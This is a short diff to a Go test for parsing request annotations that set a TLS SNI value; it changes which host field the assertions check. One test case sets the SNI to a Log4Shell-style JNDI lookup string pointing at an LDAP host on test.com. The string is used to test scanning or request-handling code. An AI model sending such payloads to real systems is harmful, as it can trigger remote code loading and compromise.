@@ -23,7 +23,7 @@ func TestRequestParseAnnotationsSNI(t *testing.T) {
 		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
 		require.True(t, modified, "could not apply request annotations")
 		require.Equal(t, "github.com", overrides.request.TLS.ServerName)
-		require.Equal(t, "example.com", overrides.request.URL.Hostname())
+		require.Equal(t, "example.com", overrides.request.Host)
 	})
 	t.Run("non-compliant-SNI-value", func(t *testing.T) {
 		req := &Request{connConfiguration: &httpclientpool.Configuration{}}
@@ -37,7 +37,7 @@ func TestRequestParseAnnotationsSNI(t *testing.T) {
 		overrides, modified := req.parseAnnotations(rawRequest, httpReq)
 		require.True(t, modified, "could not apply request annotations")
 		require.Equal(t, "${jndi:ldap://${hostName}.test.com}", overrides.request.TLS.ServerName)
-		require.Equal(t, "example.com", overrides.request.URL.Hostname())
+		require.Equal(t, "example.com", overrides.request.Host)
 	})
 }
 
